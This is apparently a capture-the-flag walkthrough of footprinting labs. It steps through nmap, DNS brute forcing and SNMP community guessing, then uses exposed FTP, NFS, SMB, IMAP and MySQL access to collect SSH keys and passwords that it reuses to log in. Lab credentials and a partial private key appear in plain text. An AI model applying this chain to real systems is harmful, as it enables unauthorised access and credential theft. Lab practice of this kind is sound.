## Easy
#### NMAP 
``` bash
user@parrot:~$ sudo nmap 10.129.42.195 -A -T5 -Pn -n --disable-arp-ping     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 01:16 AEDT      
Warning: 10.129.42.195 giving up on port because retransmission cap hit (2).   
Nmap scan report for 10.129.42.195                                  
Host is up (0.41s latency).                                    
Not shown: 983 closed tcp ports (reset)                      
PORT      STATE    SERVICE         VERSION            
21/tcp    open     ftp             ProFTPD            
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)          
| ssh-hostkey:                                 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA) 
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)    
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)  
53/tcp    open     domain          ISC BIND 9.16.1 (Ubuntu Linux)  
| dns-nsid:                                                       
|_  bind.version: 9.16.1-Ubuntu                                 
646/tcp   filtered ldp            
691/tcp   filtered resvc          
1334/tcp  filtered writesrv       
1433/tcp  filtered ms-sql-s       
1755/tcp  filtered wms           
2121/tcp  open     ccproxy-ftp?     
| fingerprint-strings:              
|   GenericLines:                    
|     220 ProFTPD Server (Ceil\'s FTP) [10.129.42.195]  
|     Invalid command: try being more creative         
|_    Invalid command: try being more creative        
5221/tcp  filtered 3exmp                
5679/tcp  filtered activesync       
6792/tcp  filtered unknown          
6901/tcp  filtered jetstream         
8093/tcp  filtered unknown           
32778/tcp filtered sometimes-rpc19   
45100/tcp filtered unknown           
49154/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.94SVN%I=7%D=10/20%Time=68F4F2E4%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[1
SF:0\.129\.42\.195\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more
SF:\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20c
SF:reative\r\n");                                   
Aggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Infomir MAG-250 set-top b
ox (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%) 
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS                               
1   511.93 ms 10.10.14.1                            
2   511.95 ms 10.129.42.195

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 231.56 seconds
```
#### DNSENUM
``` bash
user@parrot:~$ dnsenum --dnsserver 10.129.42.195 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt internal.inlanefreight.htb                              
dnsenum VERSION:1.2.6            
-----   internal.inlanefreight.htb   -----
Host\'s addresses:                                   
__________________                    
Name Servers:                                       
______________                       
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

Mail (MX) Servers:                                  
___________________                                 
Trying Zone Transfers and getting Bind Versions:
_________________________________________________
unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 900 thread 2.

Trying Zone Transfer for internal.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers

Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:
___________________________________________________

ftp.internal.inlanefreight.htb.          604800   IN    A         127.0.0.1
ns.internal.inlanefreight.htb.           604800   IN    A        10.129.34.136
vpn.internal.inlanefreight.htb.          604800   IN    A        10.129.1.6
mail1.internal.inlanefreight.htb.        604800   IN    A        10.129.18.200
wsus.internal.inlanefreight.htb.         604800   IN    A        10.129.18.2
ws1.internal.inlanefreight.htb.          604800   IN    A        10.129.1.34
ws2.internal.inlanefreight.htb.          604800   IN    A        10.129.1.35
dc1.internal.inlanefreight.htb.          604800   IN    A        10.129.34.16
dc2.internal.inlanefreight.htb.          604800   IN    A        10.129.34.11
```
#### FTP

``` bash
user@parrot:~$ ftp 10.129.42.195 2121                  
Connected to 10.129.42.195.                         
220 ProFTPD Server (Ceil\'s FTP) [10.129.42.195]                                                                                       
Name (10.129.42.195:user): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10633|)
150 Opening ASCII mode data connection for file list 
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||63314|)
150 Opening ASCII mode data connection for file list 
drwx------   2 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||45049|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |**********************************************************************************************************************************************************************|  3381       87.14 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (15.98 KiB/s)
ftp> exit
221 Goodbye
```
Use the ssh key file and retrieve the flag :)

## Medium
#### NMAP
``` bash
user@parrot:~$ sudo nmap 10.129.94.9 --top-ports=10000 -T5 -Pn -n --disable-arp-ping
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 16:05 AEDT
Warning: 10.129.94.9 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.94.9
Host is up (0.18s latency).
Not shown: 8244 closed tcp ports (reset), 116 filtered tcp ports (no-response)
PORT      STATE SERVICE
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm

Nmap done: 1 IP address (1 host up) scanned in 109.31 seconds


user@parrot:~$ sudo nmap 10.129.94.9 -p111,135,139,445,2049,3389,5985,47001 -T5 -Pn -n --disable-arp-ping -sV -sC                                                                                                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 17:34 AEDT    
Nmap scan report for 10.129.94.9                                    
Host is up (0.21s latency).                                    
PORT      STATE SERVICE       VERSION            
111/tcp   open  rpcbind       2-4 (RPC #100000)     
| rpcinfo:                                          
|   program version    port/proto  service         
|   100000  2,3,4        111/tcp   rpcbind         
|   100000  2,3,4        111/tcp6  rpcbind         
|   100000  2,3,4        111/udp   rpcbind         
|   100000  2,3,4        111/udp6  rpcbind         
|   100003  2,3         2049/udp   nfs           
|   100003  2,3         2049/udp6  nfs           
|   100003  2,3,4       2049/tcp   nfs          
|   100003  2,3,4       2049/tcp6  nfs          
|   100005  1,2,3       2049/tcp   mountd       
|   100005  1,2,3       2049/tcp6  mountd       
|   100005  1,2,3       2049/udp   mountd       
|   100005  1,2,3       2049/udp6  mountd        
|   100021  1,2,3,4     2049/tcp   nlockmgr     
|   100021  1,2,3,4     2049/tcp6  nlockmgr     
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-20T05:35:42+00:00
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2025-10-19T04:18:10
|_Not valid after:  2026-04-20T04:18:10
|_ssl-date: 2025-10-20T05:35:50+00:00; -1h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-20T05:35:42
|_  start_date: N/A
|_clock-skew: mean: -1h00m00s, deviation: 0s, median: -1h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.27 seconds
```
#### SHOWMOUNT
``` bash
user@parrot:~$ showmount -e 10.129.94.9
Export list for 10.129.94.9:
/TechSupport (everyone)

user@parrot:~$ sudo mkdir TEMP && sudo mount -t nfs 10.129.94.9://TechSupport ./TEMP

user@parrot:~$ sudo cat TEMP/ticket4238791283782.txt     
Conversation with InlaneFreight Ltd            
Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
  So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1 smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8 }
 9
10 securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   
---
```

#### SMBCLIENT
``` bash
user@parrot:~$ smbclient -L //10.129.94.9 -U alex
Password for [WORKGROUP\alex]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        devshare        Disk      
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.94.9 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

user@parrot:~$ smbclient //10.129.94.9/devshare -U alex
Password for [WORKGROUP\alex]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 11 03:12:22 2021
  ..                                  D        0  Thu Nov 11 03:12:22 2021
  important.txt                       A       16  Thu Nov 11 03:12:55 2021

                10328063 blocks of size 4096. 6100038 blocks available
smb: \> get important.txt 
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

user@parrot:~$ cat important.txt 
sa:87N1ns@slls83
```

#### RDP w/ pw reuse
``` bash
user@parrot:~$ xfreerdp /v:10.129.94.9 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```

![[Pasted image 20251020131118.png]]

Password of user HTB: lnch7ehrdn43i7AoqVPK4zWR

## HARD
#### NMAP for UDP as well
``` bash
user@parrot:~$ sudo nmap 10.129.186.211 -p22,110,143,993,995 -T5 -Pn -n --disable-arp-ping -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 22:58 AEDT
Nmap scan report for 10.129.186.211
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) STLS RESP-CODES USER UIDL CAPA TOP PIPELINING
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: LITERAL+ STARTTLS ID have more OK post-login AUTH=PLAINA0001 listed IDLE capabilities Pre-login ENABLE SASL-IR IMAP4rev1 LOGIN-REFERRALS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: LITERAL+ have ID more OK post-login AUTH=PLAINA0001 listed IDLE capabilities Pre-login ENABLE SASL-IR LOGIN-REFERRALS IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: AUTH-RESP-CODE UIDL SASL(PLAIN) USER PIPELINING CAPA RESP-CODES TOP
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.32 seconds

user@parrot:~$ sudo nmap 10.129.186.211 -p U:161 -T5 -Pn -n --disable-arp-ping -sV -sC -sU
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 23:03 AEDT
Nmap scan report for 10.129.186.211
Host is up (0.34s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
|_  snmpEngineTime: 11m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```
#### SNMP - onesixtyone
``` bash
user@parrot:~$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.186.211
Scanning 1 hosts, 3218 communities
10.129.186.211 [backup] Linux NIXHARD 5.4.0-90-generic \#101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

user@parrot:~$ snmpwalk -v2c -c backup 10.129.186.211
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
```
#### openssl:imaps
``` bash
user@parrot:~$ snmpwalk -v2c -c backup 10.129.186.211     
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"               
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10     
iso.3.6.1.2.1.1.3.0 = Timeticks: (98381) 0:16:23.81      
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>" 
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"                        
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (19) 0:00:00.19
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

user@parrot:~$ openssl s_client -connect 10.129.186.211:imaps
CONNECTED(00000003)
Can\'t use SSL_get_servername
depth=0 CN = NIXHARD
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = NIXHARD
verify return:1
---
Certificate chain
 0 s:CN = NIXHARD
   i:CN = NIXHARD
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov 10 01:30:25 2021 GMT; NotAfter: Nov  8 01:30:25 2031 GMT
   ---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC0zCCAbugAwIBAgIUC6tYfrtqQqCrhjYv11bUtaKet3EwDQYJKoZIhvcNAQEL
w1P9nA6lkg7NopyqepulLAzIcqnTjb/nMD2Pd9b6vgWc3IqSfFreqjzshZ+FjNZo
zR+tR6z4TQ==
-----END CERTIFICATE-----
subject=CN = NIXHARD
issuer=CN = NIXHARD
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1283 bytes and written 377 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---

read R BLOCK
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
  
1337 login tom NMds732Js2761     
                   
1337 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIS
T-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in

1337 list "" *

* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
1337 OK List completed (0.056 + 0.000 + 0.055 secs). 

1337 select "INBOX"

* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
  * OK [UIDVALIDITY 1636509064] UIDs valid                                                                                                                                                                           
* OK [UIDNEXT 2] Predicted next UID
1337 OK [READ-WRITE] Select completed (0.015 + 0.000 + 0.014 secs).

1336 fetch 1 (body[])

* 1 FETCH (BODY[] {3661}
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
)
1336 OK Fetch completed (0.021 + 0.000 + 0.020 secs).
```
#### Mysql
``` bash
sudo ssh -i id_rsa2 tom@10.129.186.211.
tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761
mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SELECT * FROM users WHERE username='HTB';
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.02 sec)
```
